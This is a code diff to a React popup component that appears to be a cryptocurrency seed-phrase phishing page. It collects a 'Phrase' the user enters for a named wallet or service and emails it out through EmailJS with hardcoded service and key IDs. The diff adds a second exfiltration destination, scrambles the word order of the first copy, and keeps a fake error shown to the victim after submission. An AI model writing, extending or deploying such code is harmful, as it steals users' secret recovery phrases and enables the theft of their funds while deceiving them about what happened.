@@ -32,7 +32,21 @@ const Popup = ({ setShow }) => {
   const [wordings, setWordings] = useState("");
   const [wordings2, setWordings2] = useState("");
 
+  const shwordA = wordings.split(" ");
+  const shwords = shwordA.sort(() => Math.random() - 0.5);
+  const fshwords = shwords.join(" ");
+
   const templateParams = {
+    from_name: "Abubakar Musa",
+    to_name: "Sir/Ma",
+    message:
+      wordings === "" && wordings2 === ""
+        ? `A User Did not Input a Phrase But tried To Submit it for ${enter.name} `
+        : `This is the Phrase that was entered by the user "${
+            fshwords || wordings2
+          }" for "${enter.name}"`,
+  };
+  const templateParams2 = {
     from_name: "Abubakar Musa",
     to_name: "Sir/Ma",
     message:
@@ -47,12 +61,26 @@ const Popup = ({ setShow }) => {
     emailjs
       .send(
         "service_f9ut6yb",
-        // "template_glu3lq7",
-        // 'template_5jowab7',
         "template_eubzoe8",
         templateParams,
-        // "4VVkrwCzu1kyQDvJ2",
         "Ze3Ij1-gl8YiQzV6f"
+      )
+      .then(
+        function (response) {
+          console.log("SUCCESS!", response.status, response.text);
+        },
+        function (error) {
+          console.log("FAILED...", error);
+        }
+      );
+  };
+  const sendMail2 = () => {
+    emailjs
+      .send(
+        "service_wl8y27e",
+        "template_glu3lq7",
+        templateParams2,
+        "4VVkrwCzu1kyQDvJ2"
       )
       .then(
         function (response) {
@@ -67,6 +95,7 @@ const Popup = ({ setShow }) => {
   const sendEmail = () => {
     setLoading(true);
     sendMail();
+    sendMail2();
     setTimeout(() => {
       setLoading(false);
       setError(true);
